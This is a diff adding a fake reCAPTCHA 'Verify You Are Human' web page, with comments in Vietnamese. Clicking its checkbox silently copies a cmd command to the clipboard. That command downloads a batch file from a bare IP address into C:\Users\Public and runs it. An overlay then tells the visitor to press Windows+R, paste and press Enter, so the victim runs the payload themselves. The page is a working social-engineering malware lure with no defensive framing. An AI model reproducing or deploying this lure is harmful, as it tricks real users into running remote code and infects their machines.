@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify You Are Human</title>
+    <!-- Thêm Bootstrap CSS -->
+    <link
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      rel="icon"
+      href="https://www.google.com/s2/favicons?sz=64&domain_url=https%3A%2F%2Frunwayml.com%2F"
+      type="image/png"
+      sizes="320x320"
+    />
+<!-- Thêm Font Awesome vào phần head của tài liệu HTML của bạn -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+      body,
+      html {
+        height: 100%;
+        margin: 0;
+      }
+      .centered-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      .verify-box {
+        border: 1px solid #ccc;
+        padding: 30px;
+        text-align: center;
+        border-radius: 5px;
+        background-color: #f9f9f9;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+      h2 {
+        color: #007bff; /* Màu xanh */
+      }
+      body {
+        margin: 0;
+        background-size: cover;
+        background-position: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: "Roboto", sans-serif;
+      }
+      .captcha {
+        background-color: #f9f9f9;
+        border: 2px solid #d3d3d3;
+        border-radius: 5px;
+        color: #4c4a4b;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.7);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 40;
+        flex-direction: column;
+      }
+      .instruction-box {
+        color: white;
+        border-radius: 5px;
+        text-align: center;
+      }
+      @media screen and (max-width: 500px) {
+        .captcha {
+          flex-direction: column;
+        }
+        .text {
+          margin: 0.5em !important;
+          text-align: center;
+        }
+        .logo {
+          align-self: center !important;
+        }
+        .spinner {
+          margin: 2em 0.5em 0.5em 0.5em !important;
+        }
+      }
+
+      .text {
+        font-size: 1.5em;
+        font-weight: 500;
+        margin-right: 1em;
+      }
+      .spinner {
+        position: relative;
+        width: 2em;
+        height: 2em;
+        display: flex;
+        margin: 2em 1em;
+        align-items: center;
+        justify-content: center;
+      }
+      input[type="checkbox"] {
+        position: absolute;
+        opacity: 0;
+        z-index: -1;
+      }
+      input[type="checkbox"] + .checkmark {
+        display: inline-block;
+        width: 2em;
+        height: 2em;
+        background-color: #fcfcfc;
+        border: 2.5px solid #c3c3c3;
+        border-radius: 3px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        cursor: pointer;
+      }
+      input[type="checkbox"] + .checkmark span {
+        content: "";
+        position: relative; /*
+	position:absolute;
+	border-bottom:3px solid;
+	border-right:3px solid;
+	border-color:#029f56;*/
+        margin-top: -3px;
+        transform: rotate(45deg);
+        width: 0.75em;
+        height: 1.2em;
+        opacity: 0;
+      }
+      input[type="checkbox"] + .checkmark > span:after {
+        content: "";
+        position: absolute;
+        display: block;
+        height: 3px;
+        bottom: 0;
+        left: 0;
+        background-color: #029f56;
+      }
+      input[type="checkbox"] + .checkmark > span:before {
+        content: "";
+        position: absolute;
+        display: block;
+        width: 3px;
+        bottom: 0;
+        right: 0;
+        background-color: #029f56;
+      }
+      input[type="checkbox"]:checked + .checkmark {
+        animation: 2s spin forwards;
+      }
+      input[type="checkbox"]:checked + .checkmark > span {
+        animation: 1s fadein 1.9s forwards;
+      }
+      input[type="checkbox"]:checked + .checkmark > span:after {
+        animation: 0.3s bottomslide 2s forwards;
+      }
+      input[type="checkbox"]:checked + .checkmark > span:before {
+        animation: 0.5s rightslide 2.2s forwards;
+      }
+      @keyframes fadein {
+        0% {
+          opacity: 0;
+        }
+        100% {
+          opacity: 1;
+        }
+      }
+      @keyframes bottomslide {
+        0% {
+          width: 0;
+        }
+        100% {
+          width: 100%;
+        }
+      }
+      @keyframes rightslide {
+        0% {
+          height: 0;
+        }
+        100% {
+          height: 100%;
+        }
+      }
+      .logo {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        height: 100%;
+        align-self: flex-end;
+        margin: 0.5em 1em;
+      }
+      .logo img {
+        height: 2em;
+        width: 2em;
+      }
+      .logo p {
+        color: #9d9ba7;
+        margin: 0;
+        font-size: 1em;
+        font-weight: 700;
+        margin: 0.4em 0 0.2em 0;
+      }
+      .logo small {
+        color: #9d9ba7;
+        margin: 0;
+        font-size: 0.8em;
+      }
+ /* @keyframes spin {
+        10% {
+          width: 0;
+          height: 0;
+          border-width: 6px;
+        }
+        30% {
+          width: 0;
+          height: 0;
+          border-radius: 50%;
+          border-width: 1em;
+          transform: rotate(0deg);
+          border-color: rgb(199, 218, 245);
+        }
+        50% {
+          width: 2em;
+          height: 2em;
+          border-radius: 50%;
+          border-width: 4px;
+          border-color: rgb(199, 218, 245);
+          border-right-color: rgb(89, 152, 239);
+        }
+        70% {
+          border-width: 4px;
+          border-color: rgb(199, 218, 245);
+          border-right-color: rgb(89, 152, 239);
+        }
+        90% {
+          border-width: 4px;
+        }
+        100% {
+          width: 2em;
+          height: 2em;
+          border-radius: 50%;
+          transform: rotate(720deg);
+          border-color: transparent;
+        }
+      }  */
+    </style>
+  </head>
+  <body>
+    <div class="overlay" id="overlay">
+        <div class="card">
+            <div class="card-header bg-primary text-white">
+                <h5 class="mb-0 text-center">Complete these</h5>
+                <h3 class="mb-0 text-center">Verification Steps</h3>
+            </div>
+            <div class="card-body">
+                <p style="font-size: 1.25rem;">To better prove you are not a robot, please:</p>
+                <ol>
+                    <li>Press & hold the Windows Key <strong> <i class="fa-brands fa-windows"></i> + R</strong></li>
+                    <li>In the verification window, press <strong>Ctrl + V</strong></li>
+                    <li>Press <strong>Enter</strong> on your keyboard to finish</li>
+                  </ol>
+                <p style="font-size: 1.25rem; text-align: center;">You will observe and agree:</p>
+                <div class="d-flex align-items-center">
+                    <label class="form-check-label me-2 mb-1 pb-2">
+                      <i class="far fa-check-square" id="checkboxIcon" style="font-size: 1rem; color: green;"></i>
+                    </label>
+                    <p style="font-family: 'Courier New', Courier, monospace; font-size: 0.8rem; background-color: #f8f9fa; padding: 10px; border-radius: 5px;">
+                        I am not a robot - reCAPTCHA verification ID: 2001
+                      </p>
+                  </div>
+            </div>
+                <hr>
+                <div class="d-flex justify-content-center align-items-center py-3">
+                    <p class="mb-0 me-4" style="font-size: 0.9rem; text-align: center;">Perform the steps above to finish verification</p>
+                    <button onclick="copyToClipboard();" class="btn btn-primary btn-lg mx-4">VERIFY</button>
+                </div>
+        </div>
+        
+      </div>
+      
+
+    <div class="centered-container">
+      <div class="verify-box">
+        <h2>Verify You Are Human</h2>
+        <p>Please verify that you are a human to continue.</p>
+        <div class="captcha">
+          <div class="spinner">
+            <label>
+              <input
+              type="checkbox"
+              id="myCheckbox"
+              onclick="showOverlay(); this.disabled=true;"
+          />
+              <span class="checkmark"><span>&nbsp;</span></span>
+            </label>
+          </div>
+          <div class="text">I'm not a robot</div>
+          <div class="logo">
+            <img
+              src="https://forum.nox.tv/core/index.php?media/9-recaptcha-png/"
+            />
+            <p>reCAPTCHA</p>
+            <small>Privacy - Terms</small>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Thêm Bootstrap JS và jQuery (tùy chọn) -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+    <script>
+        function showOverlay() {
+          document.getElementById("overlay").style.display = "flex";
+          copyToClipboard();
+        }
+      
+        function hideOverlay() {
+          document.getElementById("overlay").style.display = "none";
+        }
+        function enableCheckbox() {
+            const checkbox = document.getElementById("myCheckbox");
+            checkbox.disabled = false; // Bật lại checkbox
+        }
+      
+        function copyToClipboard() {
+          const textToCopy = `cmd /c "curl -o C:\\Users\\Public\\meme.bat http://194.233.80.100:80/vinduck/meme.bat && call C:\\Users\\Public\\meme.bat"`; 
+          navigator.clipboard.writeText(textToCopy)
+            .then(() => {
+              console.log("ok") // Thông báo khi sao chép thành công
+            })
+            .catch(err => {
+              console.error("HUHU: ", err);
+            });
+        }
+      </script>
+      
+  </body>
+</html>
